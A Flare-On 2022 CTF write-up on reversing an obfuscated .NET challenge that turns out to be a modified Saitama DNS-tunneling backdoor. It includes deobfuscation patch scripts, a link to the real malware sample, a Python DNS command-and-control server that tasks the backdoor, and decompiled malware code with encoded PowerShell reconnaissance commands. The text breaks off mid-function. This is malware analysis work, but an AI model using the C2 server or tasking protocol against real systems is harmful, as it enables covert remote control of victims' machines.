# Flare-On 2022: backdoor

[flare-on](/tags#flare-on ) [ctf](/tags#ctf ) [flare-on-backdoor](/tags#flare-
on-backdoor ) [reverse-engineering](/tags#reverse-engineering )
[dotnet](/tags#dotnet ) [dnspy](/tags#dnspy ) [patch](/tags#patch )
[dns-c2](/tags#dns-c2 ) [ilspy](/tags#ilspy )
[metadatatoken](/tags#metadatatoken ) [dynamic-method](/tags#dynamic-method )
[python](/tags#python ) [saitama](/tags#saitama ) [malware-
bazaar](/tags#malware-bazaar )  
  
Nov 11, 2022

  * [[1] Flaredle](/flare-on-2022/flaredle)
  * [[2] Pixel Poker](/flare-on-2022/pixel_poker)
  * [[3] Magic 8 Ball](/flare-on-2022/magic_8_ball)
  * [[4] darn_mice](/flare-on-2022/darn_mice)
  * [[5] T8](/flare-on-2022/t8)
  * [[6] à la mode](/flare-on-2022/alamode)
  * [[7] anode](/flare-on-2022/anode)
  * [8] backdoor
  * [[9] encryptor](/flare-on-2022/encryptor)
  * [[10] Nur geträumt](/flare-on-2022/nur_getraumt)
  * [[11] The challenge that shall not be named](/flare-on-2022/challenge_that_shall_not_be_named)

![backdoor](https://0xdfimages.gitlab.io/img/flare2022-backdoor-cover.png)

backdoor is the hardest challenge in the 2022 Flare-On challenge, and one of
the harder ones I’ve done. The sample is a .NET binary, but most the functions
are heavily obfuscated. I’ll deobfuscate through two different processes,
patching assembly back into the binary to get something that DNSpy can
reverse. Eventually I’ll find a real malware sample, the Saitama backdoor,
that executes command and control over DNS. Once I understand the DNS
protocol, I’ll write a DNS server to send commands in the required order to
trigger the flag.

## Challenge

> I’m such a backdoor, decompile me why don’t you…

The download contains a 32-bit Windows .NET executable:

    
    
    oxdf@hacky$ file FlareOn.Backdoor.exe 
    FlareOn.Backdoor.exe: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows
    

## Run It

Running `FlareOn.Backdoor.exe` just opens a window and hangs:

![image-20221012170941754](https://0xdfimages.gitlab.io/img/image-20221012170941754.png)

Every 30-40 seconds, there will be some DNS requests issued, visible in
Wireshark:

![image-20221020132439763](https://0xdfimages.gitlab.io/img/image-20221020132439763.png)

It also creates a file in the same directory, `flare.agent.id`, which contains
a dash and a number:

    
    
    -
    36262
    

## RE

### Initial Analysis

#### General Structure

Loading the binary into DNSpy, there are 16 classes, `FLARE01` \- `FLARE15`,
and `Program`:

![image-20221018181724384](https://0xdfimages.gitlab.io/img/image-20221018181724384.png)

Each of the classes have a bunch of functions, most named `flare_xx` or
`flared_xx`. For example:

![image-20221018181849736](https://0xdfimages.gitlab.io/img/image-20221018181849736.png)

The numbers of the `flare_*` functions often match up with or at least close
to the `flared_*` functions, but not exactly or always. In almost all cases,
there are the same number of `flare_*` and `flared_*` functions in each class.

The `Program` class has a similar structure, with a `Main` function:

![image-20221018182012074](https://0xdfimages.gitlab.io/img/image-20221018182012074.png)

#### Strings

.NET programs have a couple different heaps used for various functions, and
one is the User String heap (also called `#US`). DNSpy shows it in the
`Metadata` section, but doesn’t give details beyond that. ILSpy gives access
to the strings themselves:

![image-20221018190455350](https://0xdfimages.gitlab.io/img/image-20221018190455350.png)

Just with the strings in that image above, I can guess that there’s going to
be base32-encoded data, as well as some ability to run commands, both with
`cmd /c` and with `powershell -enc` which takes a base64-encoded string.

Some other strings that jump out include:

  * Two strings that look like a base36 alphabet and perhaps a custom / shuffled base32 alphabet:

![image-20221018190627064](https://0xdfimages.gitlab.io/img/image-20221018190627064.png)

  * Groups of three strings that each go number, three hex characters, and a command (either in plain ascii or base64-encoded):

![image-20221018190819187](https://0xdfimages.gitlab.io/img/image-20221018190819187.png)

There are 21 of these, with the first number covering all possibilities 1-21.
Decoding the strings, they each look like reconnosiance commands malware might
run:

    
    
    $ echo "RwBlAHQALQBOAGUAdABJAFAAQQBkAGQAcgBlAHMAcwAgAC0AQQBkAGQAcgBlAHMAcwBGAGEAbQBpAGwAeQAgAEkAUAB2ADQAIAB8ACAAUwBlAGwAZQBjAHQALQBPAGIAagBlAGMAdAAgAEkAUABBAGQAZAByAGUAcwBzAA==" | base64 -d
      Get-NetIPAddress -AddressFamily IPv4 | Select-Object IPAddress
    

#### Config

`FLARE03` looks like a configuration class, with many of the variables
unobfuscated:

![image-20221019134709620](https://0xdfimages.gitlab.io/img/image-20221019134709620.png)

Of particular interest is `chars_counter` and `chars_domain`, each of which
are all lowercase characters and digits, each once, and `chars_counter` has
the order mixed up in order:

![image-20221019135244764](https://0xdfimages.gitlab.io/img/image-20221019135244764.png)

I’ll also note `alive_key` and the `_domains` list has just “flare-on.com”.

### flare / flared Functions

#### flare_*

Each `flare_*` function has the same basic format. For example, `flare_69` in
`FLARE15`:

    
    
    public static byte[] flare_69(string h)
    {
    	byte[] result;
    	try
    	{
    		result = FLARE15.flared_69(h);
    	}
    	catch (InvalidProgramException e)
    	{
    		result = (byte[])FLARE15.flare_71(e, new object[]
    		{
    			h
    		}, FLARE15.gs_m, FLARE15.gs_b);
    	}
    	return result;
    

The function will try to call a corresponding `flared_*` function, with the
same function signature (argument types and return values), and save the
return in a variable called `result`. If the `flared_*` function were to throw
an `InvalidProgramException`, then that is caught and passed to either
`flare_71` or `flare_70`. In both cases, the exception and an array of the
original arguments are passed in. For the `flare_71` cases, two other values
are passed in as well, variables in `FLARE15`. Even `flare_70` fits this
pattern:

    
    
    public static object flare_70(InvalidProgramException e, object[] a)
    {
    	object result;
    	try
    	{
    		result = FLARE15.flared_70(e, a);
    	}
    	catch (InvalidProgramException e2)
    	{
    		result = FLARE15.flare_71(e2, new object[]
    		{
    			e,
    			a
    		}, FLARE15.wl_m, FLARE15.wl_b);
    	}
    	return result;
    }
    

#### flared_*

All the `flared_*` functions fail to decompile in DNSpy:

![image-20221018183049279](https://0xdfimages.gitlab.io/img/image-20221018183049279.png)

Trying a different tool, ILSpy, shows similar results:

![image-20221018183214062](https://0xdfimages.gitlab.io/img/image-20221018183214062.png)

### Starting Point

#### main

`main` also files this pattern, though it also calls `flare_74` before calling
`flared_38`:

    
    
    public static void Main(string[] args)
    {
    	try
    	{
    		try
    		{
    			FLARE15.flare_74();
    			Program.flared_38(args);
    		}
    		catch (InvalidProgramException e)
    		{
    			FLARE15.flare_70(e, new object[]
    			{
    				args
    			});
    		}
    	}
    	catch
    	{
    	}
    }
    

Stepping through this, `flare_74` works just fine (details below), but
`flared_38` throws an `InvalidProgramException`, which is passed to `flare_70`
(which as shown above tries to call `flared_70`, throws an exception itself,
and that is passed to `flared_71`).

#### flare_74

`flare_74` is different from the rest in that it lacks the call / generate
exception format. Instead, it simply initializes the variables in `FLARE15`:

![image-20221018183557368](https://0xdfimages.gitlab.io/img/image-20221018183557368.png)

Each `*_b` variable is an array of bytes, and each `*_m` is a dictionary with
`uint` keys and `int` values. These come in pairs, except for `rt_b`, which
has no corresponding `rt_m`.

`c` is also different, as it’s an `ObservableCollection` object, which seems
to be a list of ints in the single byte range:

    
    
    	FLARE15.c = new ObservableCollection<int>
    	{
    		250,
    		242,
    		240,
    		235,
    		243,
    		249,
    		247,
    		245,
    		238,
    		232,
    		253,
    		244,
    		237,
    		251,
    		234,
    		233,
    		236,
    		246,
    		241,
    		255,
    		252
    	};
    

### Layer 1 Deobfuscation

#### Analysis of Creating Dynamic Function

`flare_71` starts by taking the exception, using it to get a `StackTrace`, and
using that to get the `MetadataToken` to the top frame, which would be the
function that caused the crash. Metadata tokens are a key part of how .NET /
C# is compiled, and each thing like functions and local variable has one.
[This short post](https://jorudolph.wordpress.com/2010/08/03/net-metadata-
tokens/) does a nice job summarizing.

If I debug into this function, I’ll see the token fetched matches the token
next to the function name in DNSpy. The first visit into `flare_71` is
triggered from a failure in `flared_70`:

![image-20221018191615161](https://0xdfimages.gitlab.io/img/image-20221018191615161.png)

That token is then used to get the method, it’s parameter specifications,
local variables, etc. All of these are duplicated into a new `DynamicMethod`
object.

![image-20221018191954376](https://0xdfimages.gitlab.io/img/image-20221018191954376.png)

#### Analysis of Patching Metadata Tokens

Each call to `flare_71` also gets an array of bytes (`b`) and a dictionary
(`m`). Then there’s a loop over the items in `m`. For each value in `m`, it
tries several different ways to resolve the token based on the module,
effectively getting the correct token for the new dynamic function:

    
    
    foreach (KeyValuePair<uint, int> keyValuePair in m)
    {
        int value = keyValuePair.Value;
        uint key = keyValuePair.Key;
        bool flag = value >= 1879048192 && value < 1879113727;
        int tokenFor;
        if (flag)
        {
            tokenFor = dynamicILInfo.GetTokenFor(module.ResolveString(value));
        }
        else
        {
            MemberInfo memberInfo = declaringType.Module.ResolveMember(value, null, null);
            bool flag2 = memberInfo.GetType().Name == "RtFieldInfo";
            if (flag2)
            {
                tokenFor = dynamicILInfo.GetTokenFor(((FieldInfo)memberInfo).FieldHandle, ((TypeInfo)((FieldInfo)memberInfo).DeclaringType).TypeHandle);
            }
            else
            {
                bool flag3 = memberInfo.GetType().Name == "RuntimeType";
                if (flag3)
                {
                    tokenFor = dynamicILInfo.GetTokenFor(((TypeInfo)memberInfo).TypeHandle);
                }
                else
                {
                    bool flag4 = memberInfo.Name == ".ctor" || memberInfo.Name == ".cctor";
                    if (flag4)
                    {
                        tokenFor = dynamicILInfo.GetTokenFor(((ConstructorInfo)memberInfo).MethodHandle, ((TypeInfo)((ConstructorInfo)memberInfo).DeclaringType).TypeHandle);
                    }
                    else
                    {
                        tokenFor = dynamicILInfo.GetTokenFor(((MethodInfo)memberInfo).MethodHandle, ((TypeInfo)((MethodInfo)memberInfo).DeclaringType).TypeHandle);
                    }
                }
            }
        }
    

It’s not super important to understand this in detail, other than to say that
`value` is the metadata token that would be used in the real function, and it
uses that to get the right tokens in place so that the dynamic assembly will
work.

Then it patches the four bytes at `key` offset into `b` using the retrieved
token:

    
    
        b[(int)key] = (byte)tokenFor;
        b[(int)(key + 1U)] = (byte)(tokenFor >> 8);
        b[(int)(key + 2U)] = (byte)(tokenFor >> 16);
        b[(int)(key + 3U)] = (byte)(tokenFor >> 24);
    }
    

After the loop is complete, and each token from the dict is updated, the
buffer of bytes, `b`, is set as the code for the dynamic method and then
called:

    
    
        dynamicILInfo.SetCode(b, methodBody.MaxStackSize);
        return dynamicMethod.Invoke(null, args);
    

#### Analysis of flare_71 Invocations

`flare_71` is called 7 times, once each with each pair of `_b` and `_m`
variables as follows:

Triggering Function | Variables  
---|---  
`flared_70` | `wl_*`  
`flared_35` | `pe_*`  
`flared_47` | `db_*`  
`flared_66` | `gh_*`  
`flared_67` | `cl_*`  
`flared_68` | `rt_*`  
`flared_69` | `gs_*`  
  
I noted that there was no `rt_b`. `flare_68` calls `flare_71` with an empty
dictionary:

    
    
    		result = (int)FLARE15.flare_71(e, new object[]
    		{
    			b,
    			o
    		}, new Dictionary<uint, int>(), FLARE15.rt_b);
    

That just implies that there are no metadata tokens in that function, which
fits as `rt_b` is very short (55 bytes).

#### Script

Unfortunately the DNSpy debugger will not show the updated code as it
executes. To see what these functions are doing, I’ll need to patch the binary
with the correct functions. This can be achieved by getting each of the `_b`
byte arrays and patching in the metadata tokens from the `_m` dictionaries.
I’ll save each of these into a file named `patch_bufs.py` by copying them out
of DNSpy and using some `vim` macros to quickly reformat them into their
Python equivalents.

I’ll also need the offsets for each function, which I can get from DNSpy:

![image-20221018211250690](https://0xdfimages.gitlab.io/img/image-20221018211250690.png)

The value in the box, 0x1acec, is actually the start of the metadata for the
function. Clicking it will show the hex editor, and hovering will show the
function:

[![image-20221018211359317](https://0xdfimages.gitlab.io/img/image-20221018211359317.png)_Click
for full size
image_](https://0xdfimages.gitlab.io/img/image-20221018211359317.png)

The program byte code goes after the metadata, typically 0xc bytes after the
address given as the “File Offset”. For `flared_69`, the given offset is
0x1acec, but I’ll want to patch at `0x1acf8`.

Then I can create a function to patch, and call it for each of the seven:

    
    
    #!/usr/bin/env python3
    
    import struct
    import sys
    import patch_bufs as pb
    
    def apply_patch(exe, offset, b, m):
    
        func_bytes = bytes(b)
    
        for off, val in m:
            func_bytes = func_bytes[:off] + struct.pack("<I", val) + func_bytes[off+4:]
    
        return patch_const(exe, offset, func_bytes)
    
    
    def patch_const(exe, off, b):
    
        patched_exe = exe[:off] + b + exe[off + len(b):]
    
        return patched_exe
    
    
    if len(sys.argv) != 3:
        print(f"{sys.argv[0]} in_file out_file")
    
    with open(sys.argv[1], 'rb') as f:
        exe = f.read()
        
    exe = patch_const(exe, 0x9ce7, 0x200.to_bytes(4, 'little')) # max_alive_delay
    exe = patch_const(exe, 0x9cdd, 0x100.to_bytes(4, 'little')) # min_alive_delay
    exe = patch_const(exe, 0x9d07, 0x200.to_bytes(4, 'little')) # max_check_delay
    exe = patch_const(exe, 0x9cfd, 0x100.to_bytes(4, 'little')) # min_check_delay
    
    exe = apply_patch(exe, 0x1ae10, pb.wl_b, pb.wl_m) # patch 70
    exe = apply_patch(exe, 0x19b90, pb.gh_b, pb.gh_m) # patch 66
    exe = apply_patch(exe, 0x1acf8, pb.gs_b, pb.gs_m) # patch 69
    exe = apply_patch(exe, 0x19e0c, pb.cl_b, pb.cl_m) # patch 67
    exe = apply_patch(exe, 0x1ac5c, pb.rt_b, []) # patch 68
    exe = apply_patch(exe, 0x0abec, pb.pe_b, pb.pe_m) # patch 35
    exe = apply_patch(exe, 0x0b580, pb.d_b, pb.d_m) # patch 47
    
    with open(sys.argv[2], 'wb') as f:
        f.write(exe)
    

While I’m in here, I’ll also patch some of the delay times in `FLARE03` just
to reduce waiting in the future.

On running this and loading the new binary into DNSpy, I’ll see the
deobfuscated functions, for example:

    
    
    public static byte[] flared_69(string h)
    {
    	string location = Assembly.GetExecutingAssembly().Location;
    	FLARE09 flare = new FLARE09();
    	FLARE09.flare_37(location);
    	byte[] array = null;
    	using (FileStream fileStream = new FileStream(location, FileMode.Open, FileAccess.Read))
    	{
    		foreach (FLARE09.IMAGE_SECTION_HEADER image_SECTION_HEADER in flare.ImageSectionHeaders)
    		{
    			bool flag = h.StartsWith(new string(image_SECTION_HEADER.Name));
    			if (flag)
    			{
    				array = new byte[image_SECTION_HEADER.VirtualSize];
    				fileStream.Seek((long)((ulong)image_SECTION_HEADER.PointerToRawData), SeekOrigin.Begin);
    				fileStream.Read(array, 0, (int)image_SECTION_HEADER.VirtualSize);
    				break;
    			}
    		}
    	}
    	return array;
    }
    

#### flared_38

Of the seven functions now deobfuscated, `flared_38` is the one called from
`main`, and it looks like the `main` function:

    
    
    public static void flared_38(string[] args)
    {
    	bool flag;
    	using (new Mutex(true, "e94901cd-77d9-44ca-9e5a-125190bcf317", ref flag))
    	{
    		bool flag2 = flag;
    		if (flag2)
    		{
    			FLARE13 flare = new FLARE13();
    			FLARE13.flare_48();
    			FLARE03.flare_07();
    			for (;;)
    			{
    				try
    				{
    					switch (FLARE13.cs)
    					{
    					case FLARE08.A:
    						FLARE13.flare_50(FLARE07.A);
    						break;
    					case FLARE08.B:
    						FLARE13.flare_50(Program.flare_72());
    						break;
    					case FLARE08.C:
    						FLARE13.flare_50(FLARE05.flare_19());
    						break;
    					case FLARE08.D:
    						FLARE13.flare_50(FLARE05.flare_20());
    						break;
    					case FLARE08.E:
    						FLARE13.flare_50(FLARE14.flare_52());
    						break;
    					case FLARE08.F:
    						FLARE13.flare_50(FLARE05.flare_21());
    						break;
    					case FLARE08.G:
    						FLARE13.flare_50(FLARE05.flare_22());
    						break;
    					case FLARE08.H:
    						FLARE13.flare_50(Program.flare_73());
    						break;
    					}
    				}
    				catch (Exception ex)
    				{
    					try
    					{
    					}
    					catch
    					{
    					}
    				}
    				Thread.Sleep(1);
    			}
    		}
    	}
    }
    

It creates a mutex (to ensure only one instance runs at a time), creates a
`FLARE13` object, calls a couple functions, and then enters a infinite loop
switching on `FLARE13.cs`. `FLARE13` looks like a kind of state machine.
`FLARE08` is an enum structure, likely the states:

![image-20221019064203527](https://0xdfimages.gitlab.io/img/image-20221019064203527.png)

`A` \- `H` are the constant values 0 - 8.

`flared_50` takes a `FLARE07` as an argument. In the first case, it takes a
static one. The rest call a function that must return a `FLARE07`.

### Layer 2 Deobfuscation

#### Analysis

`flare_50`, like almost all of the rest of the functions, tries to call
`flared_50`, with an exception caught and passed to `flare_70`. To really
understand what’s going on, I’ll need to understand how `flare_70` works. It
is actually just a wrapper to call `flared_70` deobfuscated by `flare_71`, but
in my patched binary I can just look at `flared_70`:

    
    
    public static object flared_70(InvalidProgramException e, object[] a)
    {
    	StackTrace stackTrace = new StackTrace(e);
    	int metadataToken = stackTrace.GetFrame(0).GetMethod().MetadataToken;
    	string h = FLARE15.flare_66(metadataToken);
    	byte[] d = FLARE15.flare_69(h);
    	byte[] b = FLARE12.flare_46(new byte[]
    	{
    		18,
    		120,
    		171,
    		223
    	}, d);
    	return FLARE15.flare_67(b, metadataToken, a);
    }
    

The four local functions called here are all ones handled by `flare_71`, so
they are clear now.

`flared_70` takes the following steps:

  * Gets the metadata token for the function the function that triggered the exception.
  * Passes that to `flared_66` pulls together a bunch of data about the function and hashes it, returning a SHA256 hash.
  * The hash is passed to `flared_69`, which loops through all the section headers, looking for one that matches the start of the hash and returns the data in that section.
  * The data is passed to `flared_47`, which is a simple RC4 function, with a static four byte key.
  * The resulting buffer is passed to `flared_67`, along with the metadata token and the original arguments for the function.

`flared_67` is similar to `flare_71` with some differences. It starts out
defining a large dictionary, similar to the `m` variables from `flare_71`. It
does the same stuff to get the local variables and parameters for the corrupt
function, and then loops over the input buffer, `b`. It’s a bit more
complicated in how it identifies and replaces tokens, but at a high level it’s
clear that if the case is `FLARE06.OT.B`, then it does the same kind of thing
as in `flare_71` with the tokens, only it also has to apply an XOR first:

![image-20221019070822036](https://0xdfimages.gitlab.io/img/image-20221019070822036.png)

#### Scripting

Rather than try to recreate all of this process (some of which is quite
complicated), I’ll set a break point at the top of this loop. When this is
hit, I can see the function being deobfuscated, as well as the buffer of ILAsm
that’s about to have it’s tokens fixed.

![image-20221019124604975](https://0xdfimages.gitlab.io/img/image-20221019124604975.png)

I’ll right click on `b` and save it to a file, and then implement the token
bits on my own.

The `num` variable is what’s used just like the tokens in the previous round
to get the correct tokens for the dynamic method. That implies, that after
XOR, it is the token I want to run if patching.

This all leads to another function in my script:

    
    
    def apply_patch_file(exe, off, fn):
    
        with open(fn, 'rb') as f:
            b = f.read()
    
        j = 0
        while j < len(b):
            if b[j] == 254:
                key = 65024 + b[j+1]
                j += 1
            else:
                key = b[j]
            ot = pb.dict67[key]
            j += 1
            if ot == 1:
                num = b[j+3] * 16777216 + b[j+2] * 65536 + b[j+1] * 256 + b[j]
                num ^= 2727913149
                b = b[:j] + struct.pack("<I", num) + b[j+4:]
                j += 4
            elif ot == 2 or ot == 4:
                j += 1
            elif ot == 3 or ot == 6:
                j += 4
            elif ot == 5:
                j += 2
            elif ot == 7:
                j += 8
            elif ot == 8:
                j += 4 + b[j+3] * 16777216 + b[j+2] * 65536 + b[j+1] * 256 + b[j]
    
        return patch_const(exe, off, b)
    

For for `flared_38`, I’ll get the function offset the same way as above, and
add this call:

    
    
    exe = apply_patch_file(exe, 0xaf18, 'bins/38.bin')
    

This is very tedious, as I’ll need to do this for 46 functions before I can
solve that box. Still, it’s the best method I could come up with. After
patching, I’ll have to reload the binary into DNSpy. I’ll always drop a
breakpoint in `flared_70` to catch any new code paths visited.

Doing this, I’m able to patch 34 more functions.

### Saitama

#### Identification

While I was busy decoding functions, I was chatting with
[Diefunction](https://twitter.com/Diefunction), who figured out (without any
decoded functions) that this sample is based on the following logic:

  * The malware is clearly using some kind of DNS tunneling.
  * Searching on the Mandiant blog for recent articles didn’t return much.
  * Some more poking around for articles on recent samples using DNS tunneling led to a post on MalwareByte’s blog, [How the Saitama Backdoor uses DNS Tunneling](https://www.malwarebytes.com/blog/news/2022/05/how-the-saitama-backdoor-uses-dns-tunnelling) from May this year. This seemed like a likely candidate.
  * [This GitHub repo](https://github.com/morphuslabs/saitama_translator) has a tool to translate Saitama malware.

The blog post talks about using a custom base36 alphabet, which is what I
noticed above. I’ll update the base64 string in `translate.py` as so:

    
    
    t = Translator(basestring='amsjl6zci20dbt35guhw7n1fqvx4k8y9rpoe')
    for req in sys.argv[1:]:
        translated = t.translate_req(req)
        print (translated)
    

Now running that on the domain I observed earlier shows a count that’s equal
to the number in the `flare.agent.id` file, 36262:

    
    
    oxdf@hacky$ python translate.py nx3n4pw14e0.flare-on-com
    agent_id: 0,    msg_type: 0,    msg_offset:616, msg_size:None,  msg_content:b's',       request:nx3n4pw14e0.flare-on-com,       count:36262
    

Trying the same thing a couple more times shows it consistently matches. This
is a great indicator that this malware is a modified Saitama.

#### Real Sample

I’ll grab the hash from the MalwareBytes blog and find a copy on [malware
bazaar](https://bazaar.abuse.ch/download/e0872958b8d3824089e5e1cfab03d9d98d22b9bcb294463818d721380075a52d/).
This is real malware, so I’ll want to be very careful not to run it. But I’ll
download it and load it into DNSpy:

![image-20221019144802978](https://0xdfimages.gitlab.io/img/image-20221019144802978.png)

It doesn’t have the obfuscation that’s present in the challenge, so each class
has half as many functions.

The `#US` heaps has similar strings:

![image-20221019145123365](https://0xdfimages.gitlab.io/img/image-20221019145123365.png)

At the bottom, it has the numbers 1-22, with 22 strings that follow either
commands or base64 commands:

![image-20221019145159304](https://0xdfimages.gitlab.io/img/image-20221019145159304.png)

So this is similar, but different in that in the challenge:

  * the numbers are out of order;
  * the numbers and commands are grouped, rather than all the numbers, then all the commands;
  * there’s no three-character hex strings with each grouping.

#### Matching Classes

It’s pretty easy to look at the functions and their arguments / return types
and start matching up classes from the real malware with the flare sample. For
example, the first class in the malware is `Base32Encoding`, which matches up
really nicely with `FLARE01`:

![image-20221019145545481](https://0xdfimages.gitlab.io/img/image-20221019145545481.png)

Looking through these, I can match them up to the various `FLARE` classes:

    
    
    FLARE01 = Base32Encoding
    FLARE02 = Cmd
    FLARE03 = Config
    FLARE04 = Deflate
    FLARE05 = DnsClass
    FLARE06 = Enums
    FLARE07 = MachineCommand
    FLARE08 = MachineState
    FLARE10 = RandomManager
    FLARE11 = RandomMersenneTwister
    FLARE13 = StateMachine
    FLARE14 = TaskClass (with a lot more)
    FLARE15 = Util (plus some obfuscation stuff)
    Program = Program
    

`TaskClass` / `FLARE14` was the most difficult to match up. But looking at the
main loop, the fifth option shows that `FLARE14.flare_52` is the same as
`TaskClass.DoTask`:

[![image-20221019151204370](https://0xdfimages.gitlab.io/img/image-20221019151204370.png)_Click
for full size
image_](https://0xdfimages.gitlab.io/img/image-20221019151204370.png)

`FLARE14` has a bunch more functions, so those will be interesting to look at.

I wasn’t able to find matches for `FLARE09` or `FLARE12`. `FLARE12` is just
the RC4 function, used for obfuscation.

`FLARE09.flared_35` is called as part of deobfuscation, and I never identified
the other two functions. There’s also a lot of variables having to do with the
file structure (used for deobfuscation):

![image-20221019151541543](https://0xdfimages.gitlab.io/img/image-20221019151541543.png)

### FLARE14

#### Get Into FLARE14

At this point, it’s clear that I need to get into `FLARE14`, but the code
isn’t going there, and thus I can’t decrypt it via the method I’ve been using.
I did note that there is a state in the main program (`flared_38`) that calls
`FLARE14.flare_52` (which calls `flared_56`).

Right now there’s no resolution for the domain name, so it’s not progressing
to

Looking in the Saitama sample, that looks like calling `TaskClass.DoTask()`
from the state `Do`.

#### C2 Protocol

The blog post shows that the first request is the malware registering, and
I’ll need to send back any three bytes followed by an ID.

The next request will be a request for command. The first response is an IP
that gives the length of the command coming back, and then the next
resolutions have the raw command.

The post lays out five types of commands:

![image-20221019171743570](https://0xdfimages.gitlab.io/img/image-20221019171743570.png)

The same numbers are in the sample, in the `Emuns` class, under `TaskType`,
and in FlareOn under `FLARE06` under `TT`:

![image-20221019172649700](https://0xdfimages.gitlab.io/img/image-20221019172649700.png)

Let’s say I want to run `ver` like in the blog post. The command will be of
type `70`, and then the following bytes will be “ver”. So the overall length
will be four.

This means the first response be `129.0.0.4` to indicate a length of four, and
then `70.118.101.114` (where 118, 101, and 114 are “v”, “e”, and “r”).

#### DNS Server

I’ll write a small DNS server using Python:

    
    
    import socket
    from dnslib import DNSRecord, RR
    
    # Global variables
    IP = "0.0.0.0"
    PORT = 53
    
    
    def ip_gen():
    
        yield '223.223.223.223' # id
        yield '129.0.0.4'       # len for "ver" cmd
        yield '79.118.101.114'  # ver cmd
    
        while True:
            yield '127.0.0.1'
    
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind((IP, PORT))
    print('DNS Listening on {0}:{1} ...'.format(IP, PORT))
    for i, ip in enumerate(ip_gen()):
        while True:
            data, address = sock.recvfrom(650)
            dnsrecord = DNSRecord.parse(data)
            if dnsrecord.questions[0].get_qname().matchSuffix('flare-on.com'):
                break
        domain = str(dnsrecord.questions[0].get_qname())
        print(f"[*] Got request for {domain}")
        print(f"[*] Sending response {i}: {ip}")
        dnsrecord.add_answer(*RR.fromZone(f'{domain} IN A {ip}'))
        sock.sendto(dnsrecord.pack(), address)
    

Most of this is just setting up the DNS server. I don’t need threads or
anything complicated as I’m just responding to one client. It makes sure to
filter on only requests for `*.flare-on.com`, as Windows can be chatty. Then
it gets the next response, and sends it.

The `ip_gen` function is a generator function, which means i can loop over it,
and each `yield` will be a result.

#### Additional Functions

I’ll set the DNS server in my Windows VM to point to my Linux VM where I’m
running this script, and I get twelve more functions, including `flared_56`.

    
    
    $ python dns_c2-v1.py 
    DNS Listening on 0.0.0.0:53 ...
    [*] Got request for evxe1.flare-on.com.
    [*] Sending response 0: 75.99.87.223
    [*] Got request for 9jxef.flare-on.com.
    [*] Sending response 1: 129.0.0.4
    [*] Got request for wkf000xeq.flare-on.com.
    [*] Sending response 2: 79.118.101.114
    [*] Got request for 85hgggggfcquw4ktq1muifxev.flare-on.com.
    [*] Sending response 3: 129.0.0.1
    [*] Got request for 5fetttxex.flare-on.com.
    

I’ll also see a file in the same folder at the binary,
`flare.agent.recon.etr3f`:

    
    
    Microsoft Windows [Version 10.0.19044.1288]
    

It seems the command was run.

### DoTask

#### Function Overview

`DoTask` from the mawlare (or `flared_56` from the challenge) is long, but not
difficult to follow. It starts by checking if there are tasks, and if so,
getting the first one, it’s `TaskType`, and saving it’s data into `array2`:

    
    
    // Saitama.Agent.TaskClass
    // Token: 0x06000026 RID: 38 RVA: 0x00002C80 File Offset: 0x00000E80
    public static MachineCommand DoTask()
    {
    	MachineCommand machineCommand = MachineCommand.Failed;
    	try
    	{
    		if (TaskClass.ListData.Count > 0 && TaskClass.ListData[0] != null)
    		{
    			byte[] array = TaskClass.ListData[0];
    			Enums.TaskType taskType = (Enums.TaskType)array[0];
    			byte[] array2 = array.Skip(1).ToArray<byte>();
    			byte[] resultData = null;
    

Now there are switches based on `taskType`. If it’s a file related type, it
writes the rest of the data to a file, which isn’t that interesting to this
challenge. If it’s a `Static` type, then it hashes the rest of the string and
does a bunch of comparisons, eventually falling back to comparing the text to
static numbers, and setting `text` based on that:

    
    
    			if (taskType == Enums.TaskType.File || taskType == Enums.TaskType.CompressedFile)
    			{
    ...[snip]... // 
    			}
    			else
    			{
    				if (taskType == Enums.TaskType.CompressedCmd)
    				{
    					array2 = Deflate.Decompress(array2);
    				}
    				string cmd = Encoding.UTF8.GetString(array2);
    				Thread thread = new Thread(delegate()
    				{
    					string text = cmd;
    					if (taskType == Enums.TaskType.Static)
    					{
    						uint num2 = <PrivateImplementationDetails>.ComputeStringHash(text);
    						if (num2 <= 518729469U)
    						{
    							if (num2 <= 434841374U)
    							{
    								if (num2 <= 350953279U)
    								{
    									if (num2 != 334175660U)
    									{
    										if (num2 == 350953279U)
    										{
    											if (text == "19")
    											{
    												text = Cmd.Powershell("JAAoAHAAaQBuAGcAIAAtAG4AIAAxACAAMQAwAC4ANgA1AC4ANAA1AC4AMwAgAHwAIABmAGkAbgBkAHMAdAByACAALwBpACAAdAB0AGwAKQAgAC0AZQBxACAAJABuAHUAbABsADsAJAAoAHAAaQBuAGcAIAAtAG4AIAAxACAAMQAwAC4ANgA1AC4ANAAuADUAMgAgAHwAIABmAGkAbgBkAHMAdAByACAALwBpACAAdAB0AGwAKQAgAC0AZQBxACAAJABuAHUAbABsADsAJAAoAHAAaQBuAGcAIAAtAG4AIAAxACAAMQAwAC4ANgA1AC4AMwAxAC4AMQA1ADUAIAB8ACAAZgBpAG4AZABzAHQAcgAgAC8AaQAgAHQAdABsACkAIAAtAGUAcQAgACQAbgB1AGwAbAA7ACQAKABwAGkAbgBnACAALQBuACAAMQAgAGkAcwBlAC0AcABvAHMAdAB1AHIAZQAuAG0AbwBmAGEAZwBvAHYALgBnAG8AdgBlAHIALgBsAG8AYwBhAGwAIAB8ACAAZgBpAG4AZABzAHQAcgAgAC8AaQAgAHQAdABsACkAIAAtAGUAcQAgACQAbgB1AGwAbAA=");
    											}
    										}
    									}
    									else if (text == "18")
    									{
